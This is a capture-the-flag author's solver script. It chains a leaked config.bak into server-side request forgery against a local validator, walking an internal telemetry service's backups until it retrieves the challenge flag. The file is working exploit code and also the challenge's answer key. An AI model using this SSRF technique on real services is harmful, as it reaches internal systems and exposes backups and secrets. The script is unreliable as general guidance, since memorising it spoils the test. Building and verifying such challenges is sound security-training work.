"""
Author-only solver script.

Used to verify that the challenge is solvable from start to finish.
Not distributed to participants.
"""

import re
import requests

VALIDATOR = "http://localhost:8000/"


def ssrf(url):
    """
    Submit a URL to the validator and return the response body.
    """
    r = requests.post(
        VALIDATOR,
        data={"url": url},
        timeout=5
    )

    r.raise_for_status()
    return r.text


def main():

    print("[+] Step 1 - Reading config.bak...")

    config = requests.get(
        VALIDATOR + "config.bak",
        timeout=5
    ).text

    print(config)

    match = re.search(
        r"TELEMETRY_URL=(http://[^\s]+)",
        config
    )

    if not match:
        raise RuntimeError("Failed to locate TELEMETRY_URL")

    telemetry = match.group(1)

    print(f"[+] Internal service: {telemetry}")

    print("\n[+] Step 2 - Reading metrics...")

    metrics = ssrf(f"{telemetry}/metrics")

    print(metrics)

    print("\n[+] Step 3 - Enumerating backups...")

    print(ssrf(f"{telemetry}/backups/"))

    print("\n[+] Step 4 - Reading config.json...")

    print(ssrf(f"{telemetry}/backups/config.json"))

    print("\n[+] Step 5 - Reading backup manifest...")

    print(
        ssrf(
            f"{telemetry}/backups/backup_20260813/backup_manifest.txt"
        )
    )

    print("\n[+] Step 6 - Reading old.log...")

    print(
        ssrf(
            f"{telemetry}/backups/backup_20260813/old.log"
        )
    )

    print("\n[+] Step 7 - Retrieving deployment notes...")

    notes = ssrf(
        f"{telemetry}/backups/backup_20260813/temp/deployment_notes.txt"
    )

    print(notes)

    flag = re.search(r"sunctf26\{.*?\}", notes)

    if not flag:
        raise RuntimeError("Flag not found.")

    print("\n===================================")
    print("Challenge verified successfully!")
    print(f"FLAG: {flag.group(0)}")
    print("===================================")


if __name__ == "__main__":
    main()
